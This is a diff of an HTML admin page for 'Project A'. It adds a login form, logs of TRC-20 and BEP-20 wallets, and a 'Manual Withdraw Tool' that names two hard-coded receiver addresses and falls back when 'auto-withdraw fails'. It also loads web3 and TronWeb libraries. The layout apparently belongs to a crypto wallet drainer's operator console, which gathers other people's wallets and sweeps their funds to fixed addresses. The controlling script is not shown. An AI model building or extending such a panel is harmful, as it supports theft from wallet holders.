@@ -3,35 +3,41 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin Panel</title>
-  <link rel="stylesheet" href="style.css" />
+  <title>Admin Panel - Project A</title>
+  <link rel="stylesheet" href="admin.css"/>
 </head>
 <body>
-  <div class="container">
-    <h1>🔐 Project A Admin Panel</h1>
-
-    <section class="section">
-      <h2>TRC-20 Wallets</h2>
-      <ul id="trcWallets"></ul>
-    </section>
-
-    <section class="section">
-      <h2>BEP-20 Wallets</h2>
-      <ul id="bepWallets"></ul>
-    </section>
-
-    <section class="section">
-      <h2>Manual Withdraw</h2>
-      <p><strong>TRC-20:</strong> <button onclick="manualWithdrawTRC()">Withdraw All</button></p>
-      <p><strong>BEP-20:</strong> <button onclick="manualWithdrawBEP()">Withdraw All</button></p>
-    </section>
-
-    <section class="section">
-      <h2>Logs</h2>
-      <div id="logs" style="max-height: 300px; overflow-y: auto; background: #f5f5f5; padding: 10px; border-radius: 5px;"></div>
-    </section>
+  <div class="login-container" id="login-container">
+    <h2>Admin Login</h2>
+    <input type="text" id="username" placeholder="Username"/>
+    <input type="password" id="password" placeholder="Password"/>
+    <button onclick="login()">Login</button>
+    <p id="login-error"></p>
   </div>
 
+  <div id="admin-panel" style="display:none;">
+    <h1>Admin Panel - Project A</h1>
+
+    <div class="section">
+      <h2>TRC-20 Wallet Logs</h2>
+      <ul id="tron-logs"></ul>
+    </div>
+
+    <div class="section">
+      <h2>BEP-20 Wallet Logs</h2>
+      <ul id="bep-logs"></ul>
+    </div>
+
+    <div class="section">
+      <h2>Manual Withdraw Tool</h2>
+      <p><b>TRC-20 Receiver:</b> TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</p>
+      <p><b>BEP-20 Receiver:</b> 0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E</p>
+      <p>Click withdraw next to the wallet address below if auto-withdraw fails.</p>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
   <script src="admin.js"></script>
 </body>
 </html>
